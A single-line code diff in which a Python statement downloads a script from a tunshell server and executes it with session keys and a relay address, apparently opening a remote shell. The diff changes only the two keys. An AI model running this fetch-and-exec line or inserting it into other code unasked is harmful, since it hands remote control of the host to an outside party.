@@ -1,1 +1,1 @@
-import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","oFis10dKCRoZI6IXNZy9ss","83rrI0wChsK8BdQjvoqvXa","eu.relay.tunshell.com"]})
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","uT0GgpICdMVHAqDaC3BCV3","R4taRT4zfLdWyB4LdNAebG","eu.relay.tunshell.com"]})
